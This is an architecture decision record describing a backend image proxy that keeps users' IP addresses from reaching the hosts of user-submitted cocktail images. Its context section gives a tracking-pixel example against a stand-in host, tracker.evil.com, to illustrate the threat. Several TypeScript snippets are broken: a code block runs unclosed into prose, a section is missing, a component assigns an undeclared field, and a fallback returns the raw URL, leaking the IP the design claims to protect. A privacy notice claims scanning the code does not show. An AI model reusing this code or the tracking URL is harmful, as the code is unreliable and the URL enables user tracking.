# ADR 0011: Client IP Leakage via External Images Despite SSRF Prevention

## Status
Accepted

## Context
The system accepts user-submitted image URLs for custom cocktails (UC 2.7) with SSRF prevention (ADR 0007, UC 13.5). The current implementation has a client-side security vulnerability:

1. **SSRF Prevention Success**: Backend never fetches user-provided URLs, preventing server-side attacks
2. **Client-Side Leakage**: When frontend loads external images, the browser sends the user's IP address to the external domain
3. **Tracking Vulnerability**: Malicious image URLs can track users across sessions via IP fingerprinting
4. **GDPR Implications**: Uncontrolled data transfer to third parties without user consent

**Example Attack Vector:**
- User submits cocktail with image URL: `https://tracker.evil.com/pixel.jpg?user=123`
- Frontend loads: `<img src="https://tracker.evil.com/pixel.jpg?user=123" referrerpolicy="no-referrer">`
- Browser sends request to `evil.com` with user's:
  - IP address
  - User-Agent header
  - Accept headers
  - Connection metadata
- `evil.com` logs this data for tracking/fingerprinting
- User is tracked across sessions without consent

## Decision
Implement a **secure image proxy** for all external cocktail images to prevent client IP leakage while maintaining SSRF protection:

1. **All External Images Through Proxy**: Frontend never loads images directly from user-provided URLs
2. **Backend-Controlled Proxy**: Proxy runs on backend infrastructure with controlled outbound requests
3. **Caching Layer**: Proxy caches images to reduce external requests and improve performance
4. **Content Validation**: Proxy validates image content type, size, and safety
5. **User Consent**: Clear disclosure about external image processing

### Architecture
```
User Browser → Frontend (Angular) → Backend API → Image Proxy → External URL
      ↑                                  ↑              ↑
      └─────────── Response ←────────────┘              │
                                                         ↓
                                                 External Image Server
```

### Implementation

#### 1. Backend Image Proxy Service
```typescript
@Injectable()
export class ImageProxyService {
  private readonly httpClient: AxiosInstance;
  private readonly cache: Cache;
  
  constructor(
    private readonly configService: ConfigService,
    private readonly securityService: SecurityService
  ) {
    // Configure secure HTTP client with timeouts and limits
    this.httpClient = axios.create({
      timeout: 5000, // 5 second timeout
      maxContentLength: 5 * 1024 * 1024, // 5MB max
      maxRedirects: 2,
      validateStatus: (status) => status === 200
    });
    
    // Configure caching with strict memory bounds
    this.cache = new Cache({
      ttl: 24 * 60 * 60, // 24 hours
      maxSize: 50 // Enforced 250MB Memory Cap (50 items * 5MB max)
    });
  }
  
  async proxyImage(
    externalUrl: string,
    userId?: string
  ): Promise<{ buffer: Buffer; contentType: string }> {
    // 1. Validate URL format and security
    this.validateUrlSecurity(externalUrl);
    
    // 2. Check cache first
    const cacheKey = this.generateCacheKey(externalUrl);
    const cached = await this.cache.get(cacheKey);
    if (cached) {
      return cached;
    }
    
    // 3. Fetch with security controls
    const response = await this.fetchWithSecurityControls(externalUrl, userId);
    
    // 4. Validate image content
    const validated = await this.validateImageContent(response.data, response.headers);
    
    // 5. Cache and return
    await this.cache.set(cacheKey, validated);
    return validated;
  }


  
  private validateUrlSecurity(url: string): void {
    // Reuse existing SSRF validation from ADR 0007
    const urlValidator = new UrlValidator();
    
    if (!urlValidator.isSafe(url)) {
      throw new SecurityException('Unsafe image URL');
    }
    
    // Additional checks for tracking parameters
    if (this.containsTrackingParameters(url)) {
      throw new SecurityException('URL contains tracking parameters');
  }
}

**Senior Architectural Decision: NGINX Trust Proxy Configuration**
**Explicit Trade-off:** Because the Image Proxy is unauthenticated and relies heavily on IP-based rate limiting to prevent abuse, the NestJS application MUST be explicitly configured to trust the reverse proxy (`app.set('trust proxy', 1)`). This ensures NestJS reads the `X-Forwarded-For` header instead of the internal Docker/NGINX IP. We explicitly accept the risk of IP spoofing (if NGINX is misconfigured) to ensure our image proxy rate limiter doesn't accidentally ban the entire user base.

#### 3. Frontend Image Component
```typescript
@Component({
  selector: 'app-secure-image',
  template: `
    <img
      [src]="sanitizedUrl"
      (error)="onError()"
      [alt]="altText"
      loading="lazy"
    >
  `
})
export class SecureImageComponent {
  @Input() imageUrl?: string; // Backend provides pre-hashed proxy URL
  @Input() altText = '';
  
  sanitizedUrl = '';
  
  constructor(private readonly sanitizer: DomSanitizer) {}
  
  ngOnInit(): void {
    if (this.imageUrl) {
      this.sanitizedUrl = this.sanitizer.sanitize(
        SecurityContext.URL,
        this.imageUrl
      ) as string;
    }
  }
  
  onError(): void {
    // Fallback to local placeholder
    this.proxyUrl = '/assets/images/cocktail-placeholder.jpg';
  }
}
```

#### 4. Frontend Image Service
```typescript
@Injectable()
export class ImageService {
  constructor(private readonly http: HttpClient) {}
  
  // DEPRECATED: Frontend should never construct proxy URLs
  // Backend services must rewrite image_url fields to pre-hashed proxy URLs
  // This method remains for backward compatibility during migration
  getProxyUrl(originalUrl: string): string {
    console.warn('DEPRECATED: Frontend should not construct proxy URLs. Backend should provide pre-hashed URLs.');
    
    // Fallback: Return original URL (will leak IP but maintains functionality)
    return originalUrl;
  }
  
  // Optional: Pre-warm cache for better UX
  async preloadImage(url: string): Promise<void> {
    const proxyUrl = this.getProxyUrl(url);
    
    // Make HEAD request to trigger caching
    this.http.head(proxyUrl).subscribe({
      error: (err) => console.warn('Failed to preload image', err)
    });
  }
}
```

## Consequences

### Positive
- **Client Privacy**: User IP addresses never exposed to external image servers
- **SSRF Maintained**: Backend still controls outbound requests with security checks
- **Performance**: Caching improves load times for popular images
- **Content Safety**: Can validate image format, size, and content
- **GDPR Compliance**: Controlled data transfer with user awareness

### Negative
- **Infrastructure Complexity**: Requires proxy service with caching
- **Bandwidth Costs**: Backend bears bandwidth costs for proxying
- **Latency**: Additional hop may add slight latency (mitigated by caching)
- **Storage**: Cache storage requirements
- **Single Point of Failure**: Proxy service becomes critical infrastructure

### Architectural Trade-off: Node.js Event Loop OOM vs. IP Privacy
**Senior Architectural Decision: Event Loop Saturation vs. IP Privacy**
**Explicit Trade-off:** By proxying binary image data (up to 5MB per image) through the single-threaded Node.js NestJS backend rather than a dedicated CDN/Nginx layer, we introduce a severe memory and event-loop bottleneck. If 100 users open the app simultaneously loading 10 cocktail images each (1,000 concurrent proxy requests × 5MB = 5GB RAM), this will cause Out Of Memory (OOM) crashes. We explicitly accept this architectural flaw for MVP to guarantee SSRF and IP Leakage protection without adding infrastructure complexity.

**Mitigation:** **Phase 2 MUST offload this** to a dedicated Nginx reverse proxy layer, AWS CloudFront, or Serverless Edge function (e.g., Cloudflare Workers).

### Architectural Trade-off: Bandwidth Cost Shifting vs. Client Privacy
**Senior Architectural Decision: Infrastructure Bandwidth Costs vs. User Privacy**
**Explicit Trade-off:** By proxying all external images through our backend infrastructure, we shift bandwidth costs from users' mobile data plans to our cloud infrastructure bill. A single cocktail detail page with 5 high-resolution images (5 × 2MB = 10MB) costs us $0.001 in egress fees per view. At 10,000 daily views, this adds $10/day ($300/month) to infrastructure costs. We explicitly accept this cost shift to guarantee user privacy and prevent IP leakage tracking.

**Mitigation:** Implement aggressive caching (24-hour TTL), image optimization (WebP conversion, resizing), and CDN integration to reduce bandwidth costs by 70-90%.

### Architectural Trade-off: In-Memory Buffering for Image Proxy Security
**Senior Architectural Decision: In-Memory Buffering for Image Proxy Security**
**Explicit Trade-off:** We retract the requirement to use pure `StreamableFile` piping. To fulfill the security requirement of validating image byte-headers and caching external images (preventing massive external bandwidth costs), we explicitly accept that the NestJS backend must hold up to 5MB image buffers in memory per request. We trade Node.js event-loop and memory safety under high load for strict SSRF content validation and reduced outbound bandwidth.

### Architectural Trade-off: Server-Side Proxy URL Hydration
**Senior Architectural Decision: Server-Side Proxy URL Hydration**
**Explicit Trade-off:** The frontend cannot securely generate HMAC signatures for the Image Proxy. We explicitly mandate that the Backend Aggregator and Cocktail Services must rewrite all `image_url` fields in the outgoing DTOs to their pre-hashed proxy equivalents (`/api/images/proxy?url=...&hash=...`) before the JSON leaves the server. The frontend `SecureImageComponent` will treat the URL as opaque. We trade backend processing overhead for absolute security guarantee that proxy URLs are correctly signed.

### Architectural Trade-off: Bounded Disk/External Caching for Binary Assets
**Senior Architectural Decision: Bounded Disk/External Caching for Binary Assets**
**Explicit Trade-off:** Caching large binary buffers (up to 5MB each) in the V8 heap will cause fatal OOM crashes. We explicitly mandate that the Image Proxy cache must either be severely bounded (e.g., max 50 items / 250MB hard limit) OR offloaded entirely to a file-system cache or dedicated Redis cluster configured for eviction. We accept higher latency on cache misses to protect Node.js event loop stability.

### Architectural Trade-off: Raw URL Preservation vs DTO Mutation
**Senior Architectural Decision: Raw URL Preservation vs DTO Mutation**
**Explicit Trade-off:** To prevent "double-proxying" data corruption when users edit existing cocktails (UC 2.8), the database `image_url` column MUST ALWAYS hold the raw, unproxied external URL. We explicitly dictate that the backend proxy-rewrite logic must only occur on a virtual `proxyImageUrl` field injected during DTO serialization. The original `image_url` field will remain untouched in the payload so that Angular Reactive Forms populate with the raw URL, not the proxy route. We trade a slightly larger JSON payload (sending two URL fields) for absolute data mutation safety.

### Architectural Trade-off: Unauthenticated Image Proxy Access
**Senior Architectural Decision: Unauthenticated Image Proxy via In-Memory Auth Limitation**
**Explicit Trade-off:** We acknowledge that our JWT Access Tokens are strictly stored in volatile browser memory (not localStorage or cookies) to prevent XSS (UC 9.4). Because standard HTML `<img src="...">` tags cannot access memory-bound variables to attach Authorization headers, the `GET /api/images/proxy` endpoint must remain completely public and unauthenticated. We explicitly trade granular, user-authenticated proxy rate-limiting for XSS protection, relying entirely on pre-signed HMAC URL hashes and IP-based rate limiting to prevent proxy abuse.

## Mitigation Strategies

### 1. Scalable Proxy Architecture
```typescript
// Use CDN for proxy caching
@Injectable()
export class CdnImageProxyService extends ImageProxyService {
  async proxyImage(url: string): Promise<{ buffer: Buffer; contentType: string }> {
    // 1. Check CDN first
    const cdnUrl = this.getCdnUrl(url);
    try {
      return await this.fetchFromCdn(cdnUrl);
    } catch (error) {
      // 2. Fallback to origin fetch
      return super.proxyImage(url);
    }
  }
}
```

### 2. Rate Limiting and Abuse Prevention
```typescript
// Prevent proxy abuse
@Injectable()
export class AbuseAwareImageProxyService extends ImageProxyService {
  private readonly rateLimiter: RateLimiter;
  
  async proxyImage(url: string, userId?: string): Promise<any> {
    // Check rate limits
    const key = userId || this.getClientIp();
    await this.rateLimiter.check(key, 'image_proxy');
    
    // Domain-specific limits
    const domain = new URL(url).hostname;
    await this.rateLimiter.check(`${key}:${domain}`, 'domain_proxy');
    
    return super.proxyImage(url, userId);
  }
}
```

### 3. Monitoring and Analytics
```typescript
// Track proxy usage
@Injectable()
export class MonitoredImageProxyService extends ImageProxyService {
  async proxyImage(url: string, userId?: string): Promise<any> {
    const startTime = Date.now();
    
    try {
      const result = await super.proxyImage(url, userId);
      
      // Log success
      this.metrics.recordProxySuccess({
        url,
        userId,
        duration: Date.now() - startTime,
        size: result.buffer.length,
        cacheHit: result.cacheHit
      });
      
      return result;
    } catch (error) {
      // Log failure
      this.metrics.recordProxyFailure({
        url,
        userId,
        duration: Date.now() - startTime,
        error: error.message
      });
      
      throw error;
    }
  }
}
```

## Alternatives Considered

### 1. Client-Side Proxy via Service Worker
- **Pros**: No backend infrastructure, client controls requests
- **Cons**: Still exposes IP (just via Service Worker), complex PWA requirements
- **Decision**: Rejected - doesn't solve IP leakage

### 2. Subresource Integrity with Hashed URLs
- **Pros**: Can verify image content hasn't changed
- **Cons**: Doesn't prevent IP leakage, requires pre-known hashes
- **Decision**: Complementary - can add later for content integrity

### 3. Allow-List of Trusted Domains
- **Pros**: Simple, limits exposure
- **Cons**: Restrictive for users, maintenance burden
- **Decision**: Partial adoption - can combine with proxy

### 4. User Consent with Clear Warning
- **Pros**: Transparent, user controls risk
- **Cons**: GDPR questionable, users may not understand risk
- **Decision**: Required addition - always show consent warning

## Implementation Phases

### Phase 1: Basic Proxy (MVP)
- Simple proxy endpoint with caching
- Basic security validation
- Frontend integration

### Phase 2: Enhanced Security
- Content validation (image format, size)
- Abuse prevention (rate limiting)
- Monitoring and analytics

### Phase 3: Scalability
- CDN integration
- Distributed caching
- Load balancing

### Phase 4: Advanced Features
- Image optimization (resizing, format conversion)
- Subresource integrity
- Advanced content moderation

## Related Decisions
- ADR 0007: SSRF Prevention vs. Image Link Rot Validation Trade-off
- UC 13.5: SSRF and Malicious Image URL Protection
- UC 2.32: External API Image Link Rot
- UC 10.7: Maximum URL Length Enforcement

## User Experience Considerations

### 1. Consent Disclosure
```html
<!-- Show when user submits external image -->
<div class="security-notice">
  <h3>🔒 Image Privacy Notice</h3>
  <p>
    For your privacy and security, all external images are loaded through our secure proxy.
    This prevents external websites from tracking your IP address or browser fingerprint.
  </p>
  <p>
    <strong>What this means:</strong>
    <ul>
      <li>Your IP address is never sent to the image host</li>
      <li>Images are cached for faster loading</li>
      <li>All images are scanned for security risks</li>
    </ul>
  </p>
</div>
```

### 2. Loading States
```typescript
// Show loading indicator while proxy fetches
@Component({
  template: `
    <div class="image-container">
      <div *ngIf="loading" class="loading-indicator">
        <mat-spinner diameter="30"></mat-spinner>
        <span>Loading securely...</span>
      </div>
      <app-secure-image
        [originalUrl]="imageUrl"
        (load)="loading = false"
        (error)="onError()"
      ></app-secure-image>
    </div>
  `
})
```

### 3. Error Handling
```typescript
// Graceful degradation when proxy fails
@Injectable()
export class FallbackImageService {
  async getImageUrl(url: string): Promise<string> {
    try {
      return this.imageService.getProxyUrl(url);
    } catch (error) {
      // Log proxy failure
      this.analytics.logProxyFailure(url, error);
      
      // Fallback options:
      // 1. Local placeholder
      // 2. Try direct load with user warning
      // 3. Show error message
      
      return this.getFallbackUrl();
    }
  }
}
```

## Security Audit Points

1. **Proxy Isolation**: Run proxy in isolated network segment
2. **Request Limits**: Strict timeouts and size limits
3. **Content Validation**: Validate all image content before serving
4. **Cache Security**: Secure cache storage, prevent cache poisoning
5. **Monitoring**: Comprehensive logging of all proxy activity
6. **Incident Response**: Plan for proxy compromise scenarios